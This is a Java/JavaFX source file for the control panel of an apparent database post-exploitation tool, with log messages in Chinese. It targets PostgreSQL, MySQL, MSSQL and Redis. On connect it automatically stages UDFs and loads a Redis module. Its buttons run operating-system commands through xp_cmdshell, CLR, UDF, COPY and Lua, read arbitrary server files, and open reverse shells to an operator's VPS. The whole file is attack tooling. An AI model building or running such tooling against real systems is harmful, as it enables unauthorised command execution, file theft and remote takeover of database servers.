package ui;

import controller.controllers;
import controller.udf.udfPostgresql;
import controller.udf.udfMysql;
import database.mssql;
import database.psql;
import database.mysql;
import database.redis;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Task;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.input.MouseEvent;
import javafx.scene.layout.AnchorPane;
import javafx.scene.text.Font;
import javafx.scene.text.Text;
import javafx.stage.Stage;

import java.io.IOException;
import java.net.URISyntaxException;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class panel {

    @FXML
    private TreeView<String> treeView;
    @FXML
    private TableView<ObservableList<String>> tableView;
    @FXML
    private AnchorPane rootPane;
    @FXML
    private TextArea sqlTextArea;
    @FXML
    private TextArea logTextArea;
    @FXML
    private ChoiceBox<String> execChoiceBox;
    @FXML
    private ChoiceBox<String> MySQLexecChoiceBox;
    @FXML
    private ChoiceBox<String> mssqlExecChoiceBox;
    @FXML
    private ChoiceBox<String> fileChoiceBox;
    @FXML
    private ChoiceBox<String> myfileChoiceBox;
    @FXML
    private ChoiceBox<String> mssqlFileChoiceBox;
    @FXML
    private TextField mssqlFilePathField;
    @FXML
    private TextField commandField;
    @FXML
    private TextArea psqlOutputArea;
    @FXML
    private TextField MySQLreversePort;
    @FXML
    private TextField MySQLreverseHost;
    @FXML
    private TextField filePathField;
    @FXML
    private TextField myfilePathField;
    @FXML
    private TextField reverseHost;
    @FXML
    private TextField reversePort;
    @FXML
    private TextField MySQLcommandField;
    @FXML
    private TextField mssqlCommandField;
    @FXML
    private ChoiceBox<String> redisExecChoiceBox;
    @FXML
    private TextField redisCommandField;
    @FXML
    private ChoiceBox<String> redisFileChoiceBox;
    @FXML
    private TextField redisFilePathField;
    @FXML
    private TextField redisReverseHost;
    @FXML
    private TextField redisReversePort;
    @FXML
    private TextField mssqlReverseHost;
    @FXML
    private TextField mssqlReversePort;


    private controllers ctrl;

    private final Image dbIcon = new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/database.png")));
    private final Image schemaIcon = new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/schema.png")));
    private final Image tableIcon = new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/table.png")));

    public void setControllers(controllers ctrl) throws IOException, URISyntaxException, SQLException {
        this.ctrl = ctrl;
        initDatabasesAsync();
        setupDoubleClickHandler();
        setupTreeContextMenu();
    }

    private void initDatabasesAsync() {
        if (ctrl == null || treeView == null) return;

        String dbType = ctrl.getDbType();
        if ("PostgreSQL".equals(dbType)) {
            execChoiceBox.getItems().setAll("COPY", "UDF");
            execChoiceBox.setValue("COPY");

            fileChoiceBox.getItems().setAll("PG_Read", "COPY");
            fileChoiceBox.setValue("PG_Read");
        } else if ("MySQL".equals(dbType)) {
            MySQLexecChoiceBox.getItems().setAll("UDF");
            MySQLexecChoiceBox.setValue("UDF");

            myfileChoiceBox.getItems().setAll("LOAD_DATA", "LOAD_FILE");
            myfileChoiceBox.setValue("LOAD_DATA");
        } else if ("MSSQL".equals(dbType)) {
            if (mssqlExecChoiceBox != null) {
                mssqlExecChoiceBox.getItems().setAll("xp_cmdshell", "CLR", "OLE");
                mssqlExecChoiceBox.setValue("xp_cmdshell");
            }
            if (mssqlFileChoiceBox != null) {
                mssqlFileChoiceBox.getItems().setAll("OPENROWSET", "xp_cmdshell", "DIR_LIST");
                mssqlFileChoiceBox.setValue("OPENROWSET");
            }
        } else if ("Redis".equals(dbType)) {
            if (redisExecChoiceBox != null) {
                redisExecChoiceBox.getItems().setAll("MODULE", "LUA");
                redisExecChoiceBox.setValue("MODULE");
            }
            if (redisFileChoiceBox != null) {
                redisFileChoiceBox.getItems().setAll("MODULE", "LUA");
                redisFileChoiceBox.setValue("MODULE");
            }
        }

        Task<Void> initTask = new Task<>() {
            @Override
            protected Void call() {
                String results = "";
                try {
                    if ("PostgreSQL".equals(dbType)) {
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();

                            List<String> info = db.udf_init();
                            String version = info.size() > 0 ? info.get(0) : "unknown";
                            String os = info.size() > 1 ? info.get(1) : "other";
                            String bits = info.size() > 2 ? info.get(2) : "unknown";

                            List<String> preSqls = udfPostgresql.branch(version, os, bits);
                            if (!preSqls.isEmpty()) {
                                try {
                                    db.executeSQL(String.join("\n", preSqls));
                                } catch (Exception e) {
                                    Platform.runLater(() -> logTextArea.appendText("[!] UDF 预处理失败: " + e.getMessage() + "\n"));
                                }
                            }
                        } finally {
                            db.close();
                        }
                    } else if ("MySQL".equals(dbType)) {
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();

                            List<String> info = db.udf_init();
                            String os = info.size() > 0 ? info.get(0) : "other";
                            String bits = info.size() > 1 ? info.get(1) : "unknown";
                            String pluginDir = info.size() > 2 ? info.get(2) : "/tmp/";
                            String sqlMode = info.size() > 3 ? info.get(3) : "";

                            List<String> preSqls = udfMysql.branch(os, bits, pluginDir, sqlMode);
                            if (!preSqls.isEmpty()) {
                                db.executeSQL(String.join("\n", preSqls));

                            }
                        } finally {
                            db.close();
                        }
                    } else if ("MSSQL".equals(dbType)) {
                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();
                        } finally {
                            db.close();
                        }
                    } else if ("Redis".equals(dbType)) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.getDatabaseInfo();
                            try {
                                String auto = db.autoLoadModuleFromResources();
                                results = results + "\n" + auto;
                            } catch (Exception ignored) {
                            }
                        } finally {
                            db.close();
                        }
                    }

                    final String out = results;
                    Platform.runLater(() -> logTextArea.appendText(out));

                    List<String> databases = ctrl.loadDatabases();
                    if (databases == null || databases.isEmpty()) return null;

                    Platform.runLater(() -> {
                        TreeItem<String> rootItem = new TreeItem<>("[数据库列表]");
                        rootItem.setExpanded(true);
                        rootPane.getStylesheets().add(Objects.requireNonNull(getClass().getResource("/style/panel.css")).toExternalForm());

                        for (String dbName : databases) {
                            TreeItem<String> dbItem = new TreeItem<>(dbName, createIcon(dbIcon));
                            rootItem.getChildren().add(dbItem);
                        }
                        treeView.setRoot(rootItem);
                        treeView.setShowRoot(false);
                    });
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 初始化失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        new Thread(initTask).start();
    }

    private void initDatabases() throws SQLException {
        if (ctrl == null || treeView == null) return;
        String results;
        if ("PostgreSQL".equals(ctrl.getDbType())) {
            psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            results = db.getDatabaseInfo();
            db.close();

            execChoiceBox.getItems().clear();
            execChoiceBox.getItems().add("COPY");
            execChoiceBox.getItems().add("UDF");
            execChoiceBox.setValue("COPY");

            fileChoiceBox.getItems().clear();
            fileChoiceBox.getItems().add("PG_Read");
            fileChoiceBox.getItems().add("COPY");
            fileChoiceBox.setValue("PG_Read");
        } else if ("MySQL".equals(ctrl.getDbType())) {
            mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            results = db.getDatabaseInfo();
            db.close();

            MySQLexecChoiceBox.getItems().clear();
            MySQLexecChoiceBox.getItems().add("UDF");
            MySQLexecChoiceBox.getItems().add("SQL");
            MySQLexecChoiceBox.setValue("UDF");

            myfileChoiceBox.getItems().clear();
            myfileChoiceBox.getItems().add("LOAD_DATA");
            myfileChoiceBox.getItems().add("LOAD_FILE");
            myfileChoiceBox.setValue("LOAD_DATA");
        } else if ("MSSQL".equals(ctrl.getDbType())) {
            mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            results = db.getDatabaseInfo();
            db.close();

            if (mssqlExecChoiceBox != null) {
                mssqlExecChoiceBox.getItems().clear();
                mssqlExecChoiceBox.getItems().add("xp_cmdshell");
                mssqlExecChoiceBox.getItems().add("CLR");
                mssqlExecChoiceBox.getItems().add("OLE");
                mssqlExecChoiceBox.setValue("xp_cmdshell");
            }

            if (mssqlFileChoiceBox != null) {
                mssqlFileChoiceBox.getItems().clear();
                mssqlFileChoiceBox.getItems().add("OPENROWSET");
                mssqlFileChoiceBox.getItems().add("xp_cmdshell");
                mssqlFileChoiceBox.getItems().add("DIR_LIST");
                mssqlFileChoiceBox.setValue("OPENROWSET");
            }
        } else if ("Redis".equals(ctrl.getDbType())) {
            redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            results = db.getDatabaseInfo();
            try {
                String auto = db.autoLoadModuleFromResources();
                results = results + "\n" + auto;
            } catch (Exception ignored) {
            }
            db.close();

            if (redisExecChoiceBox != null) {
                redisExecChoiceBox.getItems().clear();
                redisExecChoiceBox.getItems().add("MODULE");
                redisExecChoiceBox.getItems().add("LUA");
                redisExecChoiceBox.setValue("MODULE");
            }
            if (redisFileChoiceBox != null) {
                redisFileChoiceBox.getItems().clear();
                redisFileChoiceBox.getItems().add("MODULE");
                redisFileChoiceBox.getItems().add("LUA");
                redisFileChoiceBox.setValue("MODULE");
            }
        } else {
            results = "";
        }

        logTextArea.appendText(results);

        List<String> databases = ctrl.loadDatabases();
        if (databases == null || databases.isEmpty()) return;

        TreeItem<String> rootItem = new TreeItem<>("[数据库列表]");
        rootItem.setExpanded(true);
        rootPane.getStylesheets().add(Objects.requireNonNull(getClass().getResource("/style/panel.css")).toExternalForm());

        for (String dbName : databases) {
            TreeItem<String> dbItem = new TreeItem<>(dbName, createIcon(dbIcon));
            rootItem.getChildren().add(dbItem);
        }

        treeView.setRoot(rootItem);
        treeView.setShowRoot(false);


    }

    private void setupDoubleClickHandler() {
        treeView.addEventHandler(MouseEvent.MOUSE_CLICKED, event -> {
            if (event.getClickCount() == 2) {
                TreeItem<String> selectedItem = treeView.getSelectionModel().getSelectedItem();
                if (selectedItem == null) return;

                TreeItem<String> parent = selectedItem.getParent();
                TreeItem<String> grandparent = (parent != null) ? parent.getParent() : null;

                String selected = selectedItem.getValue();
                String parentVal = (parent != null) ? parent.getValue() : null;
                String grandVal = (grandparent != null) ? grandparent.getValue() : null;

                if (parent == treeView.getRoot() && !"Database".equals(selected)) {
                    loadSchemasAndTables(selected, selectedItem);
                } else if (grandparent != null
                        && grandparent != treeView.getRoot()
                        && grandVal != null
                        && !"Database".equals(grandVal)) {

                    String dbName = grandVal;
                    String schema = parentVal;
                    String table = selected;

                    showTableData(dbName, schema, table);
                }
            }
        });
    }

    private void setupTreeContextMenu() {
        if (treeView == null) return;

        treeView.setOnContextMenuRequested(evt -> {
            TreeItem<String> selectedItem = treeView.getSelectionModel().getSelectedItem();
            ContextMenu menu = new ContextMenu();

            MenuItem refreshAll = new MenuItem("刷新库列表");
            refreshAll.setOnAction(e -> refreshDatabaseList());

            MenuItem addConn = new MenuItem("添加连接...");
            addConn.setOnAction(e -> openAddConnectionModule());

            if (selectedItem == null || selectedItem == treeView.getRoot()) {
                menu.getItems().addAll(refreshAll, addConn);
            } else {
                MenuItem refreshStruct = new MenuItem("刷新结构");
                refreshStruct.setOnAction(e -> refreshSchemasAndTables(selectedItem));
                menu.getItems().addAll(refreshStruct, refreshAll, addConn);
            }

            treeView.setContextMenu(menu);
        });
    }

    private void refreshDatabaseList() {
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    List<String> databases = ctrl.loadDatabases();
                    Platform.runLater(() -> {
                        TreeItem<String> rootItem = new TreeItem<>("[数据库列表]");
                        rootItem.setExpanded(true);
                        for (String dbName : databases) {
                            rootItem.getChildren().add(new TreeItem<>(dbName, createIcon(dbIcon)));
                        }
                        treeView.setRoot(rootItem);
                        treeView.setShowRoot(false);
                    });
                } catch (Exception ex) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 刷新库列表失败: " + ex.getMessage() + "\n"));
                }
                return null;
            }
        };
        new Thread(task).start();
    }

    private void refreshSchemasAndTables(TreeItem<String> dbItem) {
        String dbName = dbItem.getValue();
        dbItem.getChildren().clear();
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    loadSchemasAndTables(dbName, dbItem);
                } catch (Exception ex) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 刷新结构失败: " + ex.getMessage() + "\n"));
                }
                return null;
            }
        };
        new Thread(task).start();
    }

    private void openAddConnectionModule() {
        try {
            FXMLLoader loader = new FXMLLoader(getClass().getResource("/fxml/MainUi.fxml"));
            Stage stage = new Stage();
            stage.setScene(new Scene(loader.load(), 650, 362));
            stage.setTitle("Turacos Login");
            stage.getIcons().add(new Image(Objects.requireNonNull(getClass().getResourceAsStream("/images/ico.png"))));
            stage.setResizable(false);
            stage.show();
        } catch (IOException ex) {
            logTextArea.appendText("[!] 无法打开添加连接模块: " + ex.getMessage() + "\n");
        }
    }


    public void btnExecuteSql() {
        try {
            String results;
            if ("PostgreSQL".equalsIgnoreCase(ctrl.getDbType())) {
                psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                results = db.executeSQL(sqlTextArea.getText());
                db.close();
            } else {
                mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                results = db.executeSQL(sqlTextArea.getText());
                db.close();
            }
            logTextArea.appendText("[+] 🚀 Results: \n" + results + "\n");
        } catch (Exception e) {
            logTextArea.appendText("[!] \uD83D\uDCA5 执行失败: " + e.getMessage() + "\n");
        }
    }

    private void loadSchemasAndTables(String dbName, TreeItem<String> dbItem) {
        if (dbItem.getChildren().size() > 0) return;

        if ("PostgreSQL".equalsIgnoreCase(ctrl.getDbType())) {
            psql db = new psql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            List<String> schemas = db.getSchemas();
            if (schemas == null || schemas.isEmpty()) {
                db.close();
                return;
            }
            for (String schema : schemas) {
                TreeItem<String> schemaItem = new TreeItem<>(schema, createIcon(schemaIcon));
                List<String> tables = db.getTables(schema);
                if (tables != null) {
                    for (String table : tables) {
                        schemaItem.getChildren().add(new TreeItem<>(table, createIcon(tableIcon)));
                    }
                }
                dbItem.getChildren().add(schemaItem);
            }
            dbItem.setExpanded(true);
            db.close();
        } else if ("MSSQL".equalsIgnoreCase(ctrl.getDbType())) {
            mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            List<String> schemas = db.getSchemas();
            if (schemas == null || schemas.isEmpty()) {
                db.close();
                return;
            }
            for (String schema : schemas) {
                TreeItem<String> schemaItem = new TreeItem<>(schema, createIcon(schemaIcon));
                List<String> tables = db.getTables(schema);
                if (tables != null) {
                    for (String table : tables) {
                        schemaItem.getChildren().add(new TreeItem<>(table, createIcon(tableIcon)));
                    }
                }
                dbItem.getChildren().add(schemaItem);
            }
            dbItem.setExpanded(true);
            db.close();
        } else if ("MySQL".equalsIgnoreCase(ctrl.getDbType())) {
            mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            List<String> schemas = db.getSchemas();
            if (schemas == null || schemas.isEmpty()) {
                db.close();
                return;
            }
            for (String schema : schemas) {
                TreeItem<String> schemaItem = new TreeItem<>(schema, createIcon(schemaIcon));
                List<String> tables = db.getTables(schema);
                if (tables != null) {
                    for (String table : tables) {
                        schemaItem.getChildren().add(new TreeItem<>(table, createIcon(tableIcon)));
                    }
                }
                dbItem.getChildren().add(schemaItem);
            }
            dbItem.setExpanded(true);
            db.close();
        } else if ("Redis".equalsIgnoreCase(ctrl.getDbType())) {
            redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            TreeItem<String> schemaItem = new TreeItem<>("Keys", createIcon(schemaIcon));
            List<String> keys = db.getKeys(200);
            if (keys != null) {
                for (String key : keys) {
                    schemaItem.getChildren().add(new TreeItem<>(key, createIcon(tableIcon)));
                }
            }
            dbItem.getChildren().add(schemaItem);
            dbItem.setExpanded(true);
            db.close();
        }
    }

    private void showTableData(String dbName, String schema, String table) {
        List<List<Object>> rows = List.of();
        List<String> columnNames = List.of();
        if ("PostgreSQL".equalsIgnoreCase(ctrl.getDbType())) {
            psql db = new psql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            rows = db.getTopRows(schema, table, 100);
            tableView.getColumns().clear();
            tableView.getItems().clear();
            columnNames = db.getColumnNames(schema, table);
            if (rows.isEmpty()) {
                db.close();
                return;
            }
            db.close();
        } else if ("MSSQL".equalsIgnoreCase(ctrl.getDbType())) {
            mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            rows = db.getTopRows(schema, table, 100);
            tableView.getColumns().clear();
            tableView.getItems().clear();
            columnNames = db.getColumnNames(schema, table);
            if (rows.isEmpty()) {
                db.close();
                return;
            }
            db.close();
        } else if ("MySQL".equalsIgnoreCase(ctrl.getDbType())) {
            mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), dbName, ctrl.getUsername(), ctrl.getPassword());
            rows = db.getTopRows(schema, table, 100);
            tableView.getColumns().clear();
            tableView.getItems().clear();
            columnNames = db.getColumnNames(schema, table);
            if (rows.isEmpty()) {
                db.close();
                return;
            }
            db.close();
        } else if ("Redis".equalsIgnoreCase(ctrl.getDbType())) {
            redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            List<String> vals = db.getKeyPreview(table);
            tableView.getColumns().clear();
            tableView.getItems().clear();
            columnNames = List.of("Value");
            rows = new ArrayList<>();
            for (String v : vals) {
                List<Object> r = new ArrayList<>();
                r.add(v);
                rows.add(r);
            }
            db.close();
        }

        if (columnNames == null || columnNames.isEmpty()) {
            columnNames = new ArrayList<>();
            for (int i = 0; i < rows.get(0).size(); i++) {
                columnNames.add("Col " + (i + 1));
            }
        }

        for (int i = 0; i < columnNames.size(); i++) {
            final int colIndex = i;
            TableColumn<ObservableList<String>, String> column = new TableColumn<>(columnNames.get(i));

            column.setCellValueFactory(data ->
                    new SimpleStringProperty(data.getValue().get(colIndex))
            );

            column.setCellFactory(col -> new TableCell<>() {
                @Override
                protected void updateItem(String item, boolean empty) {
                    super.updateItem(item, empty);
                    setText(empty || item == null ? "" : item);
                    setAlignment(Pos.CENTER);
                    setFont(Font.font("Consolas", 16));
                }
            });

            column.setStyle("-fx-alignment: CENTER; -fx-font-size: 16px;");

            tableView.getColumns().add(column);
        }

        for (List<Object> row : rows) {
            ObservableList<String> rowData = FXCollections.observableArrayList();
            for (Object cell : row) {
                rowData.add(cell == null ? "" : cell.toString());
            }
            tableView.getItems().add(rowData);
        }

        tableView.getColumns().forEach(col -> {
            col.setPrefWidth(20);
            double max = 0;
            Text tmp = new Text(col.getText());
            tmp.setFont(Font.font("Consolas", 16));
            max = tmp.getLayoutBounds().getWidth() + 20;

            for (ObservableList<String> rowData : tableView.getItems()) {
                String cellText = rowData.get(tableView.getColumns().indexOf(col));
                if (cellText != null) {
                    tmp.setText(cellText);
                    tmp.setFont(Font.font("Consolas", 16));
                    double width = tmp.getLayoutBounds().getWidth() + 20;
                    if (width > max) max = width;
                }
            }
            col.setPrefWidth(max);
        });
    }

    private ImageView createIcon(Image image) {
        ImageView imageView = new ImageView(image);
        imageView.setFitWidth(16);
        imageView.setFitHeight(16);
        imageView.setPreserveRatio(true);
        imageView.setSmooth(true);
        return imageView;
    }

    @FXML
    private void executeCmdButton() {
        String dbType = ctrl.getDbType();
        if (dbType == null || dbType.trim().isEmpty()) {
            logTextArea.appendText("[!] ⚠️未选择数据库类型！\n");
            return;
        }

        String execType, command;
        if ("PostgreSQL".equalsIgnoreCase(dbType)) {
            execType = execChoiceBox.getValue();
            command = commandField.getText();
        } else if ("MySQL".equalsIgnoreCase(dbType)) {
            execType = MySQLexecChoiceBox.getValue();
            command = MySQLcommandField.getText();
        } else if ("MSSQL".equalsIgnoreCase(dbType)) {
            execType = mssqlExecChoiceBox.getValue();
            command = mssqlCommandField.getText();
        } else if ("Redis".equalsIgnoreCase(dbType)) {
            execType = redisExecChoiceBox.getValue();
            command = redisCommandField.getText();
        } else {
            logTextArea.appendText("[!] ❌不支持的数据库类型: " + dbType + "\n");
            return;
        }

        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    String sql;
                    String results = "";

                    if ("PostgreSQL".equalsIgnoreCase(dbType)) {
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        sql = psql.exCmd(command.trim(), execType.trim());
                        if (sql.isEmpty()) {
                            Platform.runLater(() -> logTextArea.appendText("[!] ❌SQL 生成失败！\n"));
                            db.close();
                            return null;
                        }

                        results = db.executeSQL(sql);
                        db.close();
                    } else if ("MySQL".equalsIgnoreCase(dbType)) {
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        if (execType != null && "SQL".equalsIgnoreCase(execType.trim())) {
                            sql = mysql.exCmd(execType.trim(), command.trim());
                            if (sql.isEmpty()) {
                                Platform.runLater(() -> logTextArea.appendText("[!] ❌SQL 生成失败！\n"));
                                db.close();
                                return null;
                            }
                            results = db.executeSQL(sql);
                        } else {
                            results = db.executeCommandWithUdfFallback(command.trim());
                        }
                        db.close();
                    } else if ("MSSQL".equalsIgnoreCase(dbType)) {
                        sql = mssql.exCmd(execType.trim(), command.trim());
                        if (sql.isEmpty()) {
                            Platform.runLater(() -> logTextArea.appendText("[!] ❌SQL 生成失败！\n"));
                            return null;
                        }

                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        results = db.executeSQL(sql);
                        db.close();
                    } else if ("Redis".equalsIgnoreCase(dbType)) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        results = db.exCmd(execType.trim(), command.trim());
                        db.close();
                    }

                    String finalResults = results;
                    Platform.runLater(() -> {
                        logTextArea.appendText("[+] 🚀 Results: \n" + finalResults + "\n");
                    });
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] \uD83D\uDCA5" + e.getMessage() + "\n"));
                }
                return null;
            }
        };

        new Thread(task).start();
    }


    /**
     * 任意文件初步处理判断数据库类型。
     * :readFiles 返回文件读取SQL语句。
     * :executeSQL 执行SQL语句。
     */
    @FXML
    private void readFileButton() {
        Task<Void> task = new Task<>() {
            @Override
            protected Void call() {
                try {
                    String results = "";
                    String dbType = ctrl.getDbType();
                    if (dbType == null || dbType.trim().isEmpty()) {
                        Platform.runLater(() -> logTextArea.appendText("[!] ⚠️未选择数据库类型！\n"));
                        return null;
                    }

                    if ("postgresql".equalsIgnoreCase(dbType)) {
                        String sql = psql.readFiles(filePathField.getText(), fileChoiceBox.getValue());
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("mysql".equalsIgnoreCase(dbType)) {
                        String sql = mysql.readFiles(myfilePathField.getText(), myfileChoiceBox.getValue());
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("mssql".equalsIgnoreCase(dbType)) {
                        String sql = mssql.readFiles(mssqlFilePathField.getText(), mssqlFileChoiceBox.getValue());
                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.executeSQL(sql);
                        } finally {
                            db.close();
                        }
                    } else if ("redis".equalsIgnoreCase(dbType)) {
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            results = db.readFiles(redisFilePathField.getText(), redisFileChoiceBox.getValue());
                        } finally {
                            db.close();
                        }
                    }

                    final String out = results;
                    Platform.runLater(() -> logTextArea.appendText("[+] 🚀 Results: \n" + out + "\n"));
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] \uD83D\uDCA5读取文件失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        new Thread(task).start();
    }

    @FXML
    private void reverseShell() {
        Task<Object> task = new Task<>() {
            @Override
            protected Object call() throws Exception {
                Platform.runLater(() -> logTextArea.appendText("[+] 请在 VPS 上查看反弹 Shell 状态\n[!] 注意：反弹后其他功能可能受影响\n"));
                String dbType = ctrl.getDbType();
                if (dbType == null || dbType.trim().isEmpty()) {
                    Platform.runLater(() -> logTextArea.appendText("[!] ⚠️未选择数据库类型！\n"));
                    return null;
                }

                try {
                    if ("PostgreSQL".equalsIgnoreCase(dbType)) {
                        String host = reverseHost.getText();
                        int port = safeParsePort(reversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        psql db = new psql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.revershell(host, port);
                        } finally {
                            db.close();
                        }
                    } else if ("MySQL".equalsIgnoreCase(dbType)) {
                        String host = MySQLreverseHost.getText();
                        int port = safeParsePort(MySQLreversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        mysql db = new mysql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.reverseShell(host, port);
                        } finally {
                            db.close();
                        }
                    } else if ("MSSQL".equalsIgnoreCase(dbType)) {
                        String host = mssqlReverseHost.getText();
                        int port = safeParsePort(mssqlReversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        mssql db = new mssql(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.reverseShell(host, port);
                        } finally {
                            db.close();
                        }
                    } else if ("Redis".equalsIgnoreCase(dbType)) {
                        String host = redisReverseHost.getText();
                        int port = safeParsePort(redisReversePort.getText());
                        if (!validHostPort(host, port)) return null;
                        redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
                        try {
                            db.reverseShell(host, port);
                        } finally {
                            db.close();
                        }
                    }
                } catch (Exception e) {
                    Platform.runLater(() -> logTextArea.appendText("[!] 反弹失败: " + e.getMessage() + "\n"));
                }
                return null;
            }
        };
        new Thread(task).start();
    }

    private static int safeParsePort(String s) {
        try {
            int p = Integer.parseInt(s == null ? "" : s.trim());
            if (p < 1 || p > 65535) return -1;
            return p;
        } catch (Exception e) {
            return -1;
        }
    }

    private boolean validHostPort(String host, int port) {
        if (host == null || host.trim().isEmpty()) {
            Platform.runLater(() -> logTextArea.appendText("[!] 主机不能为空\n"));
            return false;
        }
        if (port == -1) {
            Platform.runLater(() -> logTextArea.appendText("[!] 端口无效（1-65535）\n"));
            return false;
        }
        return true;
    }

    @FXML
    private void loadRedisModuleButton() {
        try {
            redis db = new redis(ctrl.getHost(), ctrl.getPort(), ctrl.getDatabase(), ctrl.getUsername(), ctrl.getPassword());
            String result = db.autoLoadModuleFromResources();
            db.close();
            logTextArea.appendText(result + "\n");
        } catch (Exception e) {
            logTextArea.appendText("[!] \uD83D\uDCA5模块加载失败: " + e.getMessage() + "\n");
        }
    }
}
